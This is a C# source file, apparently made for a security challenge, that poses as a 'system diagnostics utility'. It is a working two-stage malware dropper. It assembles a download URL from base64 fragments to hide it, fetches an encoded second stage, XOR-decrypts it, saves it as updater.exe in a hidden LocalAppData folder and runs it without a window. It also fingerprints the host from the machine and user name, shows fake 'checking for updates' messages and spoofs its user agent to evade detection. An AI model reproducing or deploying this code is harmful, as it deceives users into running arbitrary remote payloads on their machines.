using System;
using System.IO;
using System.Net;
using System.Text;
using System.Reflection;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Threading;

namespace Payload.Labyrinth
{
    class Program
    {
        // Obfuscated configuration
        private static readonly string[] serverParts = new string[] 
        {
            "aHR0", "cDov", "L3Jh", "dy5n", "aXRo", "dWJ1", "c2Vy", "Y29u", "dGVu", "dC5j", "b20v"
        };
        
        private static readonly string[] pathParts = new string[] 
        {
            "dXNl", "ci9z", "ZWNy", "ZXRf", "cmVw", "by9t", "YWlu", "L3N0", "YWdl", "Mi50", "eHQ="
        };

        // XOR key for simple string obfuscation
        private static readonly byte[] xorKey = new byte[] { 0x13, 0x37, 0x42, 0x69, 0x72, 0x64 };

        static void Main(string[] args)
        {
            try
            {
                Console.WriteLine("System diagnostics utility v1.2.3");
                Console.WriteLine("Initializing components...");
                
                // Create hidden working directory
                string workDir = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    ".sysutils"
                );
                
                if (!Directory.Exists(workDir))
                {
                    Directory.CreateDirectory(workDir);
                    File.SetAttributes(workDir, FileAttributes.Hidden);
                }
                
                // Collect basic system info
                string sysInfo = CollectSystemInfo();
                Console.WriteLine("System information collected successfully.");
                
                // Generate fingerprint (useful for tracking)
                string fingerprint = GenerateFingerprint(sysInfo);
                Console.WriteLine("System fingerprint: " + fingerprint);
                
                // Assemble URL from obfuscated parts
                string serverUrl = DecodeBase64Array(serverParts);
                string path = DecodeBase64Array(pathParts);
                
                string url = serverUrl + path;
                
                Console.WriteLine("Checking for updates...");
                
                // Download the second stage
                byte[] secondStageEncoded = DownloadData(url);
                if (secondStageEncoded == null || secondStageEncoded.Length == 0)
                {
                    Console.WriteLine("Update check failed. Please try again later.");
                    Environment.Exit(1);
                }
                
                // Decode the second stage
                string secondStageB64 = Encoding.UTF8.GetString(secondStageEncoded);
                byte[] secondStage = Convert.FromBase64String(secondStageB64);
                
                // Decrypt XOR encryption on second stage
                for (int i = 0; i < secondStage.Length; i++)
                {
                    secondStage[i] = (byte)(secondStage[i] ^ xorKey[i % xorKey.Length]);
                }
                
                // Save and execute second stage
                string stagePath = Path.Combine(workDir, "updater.exe");
                File.WriteAllBytes(stagePath, secondStage);
                
                Console.WriteLine("Updates found. Applying...");
                
                // Execute the second stage
                Process.Start(new ProcessStartInfo
                {
                    FileName = stagePath,
                    Arguments = fingerprint,
                    UseShellExecute = false,
                    CreateNoWindow = true
                });
                
                Console.WriteLine("Update process started.");
            }
            catch (Exception ex)
            {
                // Hide actual error messages, but log them to a file for debugging
                Console.WriteLine("An error occurred. Please try again later.");
                
                string errorLog = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "sysdiag_error.log"
                );
                
                File.AppendAllText(errorLog, DateTime.Now.ToString() + ": " + ex.ToString() + Environment.NewLine);
            }
        }
        
        private static string CollectSystemInfo()
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("OS: " + Environment.OSVersion.ToString());
            sb.AppendLine("Machine Name: " + Environment.MachineName);
            sb.AppendLine("User: " + Environment.UserName);
            sb.AppendLine("Processors: " + Environment.ProcessorCount);
            sb.AppendLine("64-bit OS: " + Environment.Is64BitOperatingSystem);
            
            return sb.ToString();
        }
        
        private static string GenerateFingerprint(string input)
        {
            using (MD5 md5 = MD5.Create())
            {
                byte[] inputBytes = Encoding.UTF8.GetBytes(input);
                byte[] hashBytes = md5.ComputeHash(inputBytes);
                
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < hashBytes.Length; i++)
                {
                    sb.Append(hashBytes[i].ToString("x2"));
                }
                
                return sb.ToString();
            }
        }
        
        private static string DecodeBase64Array(string[] parts)
        {
            StringBuilder sb = new StringBuilder();
            foreach (string part in parts)
            {
                byte[] bytes = Convert.FromBase64String(part);
                sb.Append(Encoding.UTF8.GetString(bytes));
            }
            
            return sb.ToString();
        }
        
        private static byte[] DownloadData(string url)
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    // Add fake user agent to avoid detection
                    client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                    return client.DownloadData(url);
                }
            }
            catch
            {
                // For the challenge, we'll just return null on failure
                return null;
            }
        }
    }
}
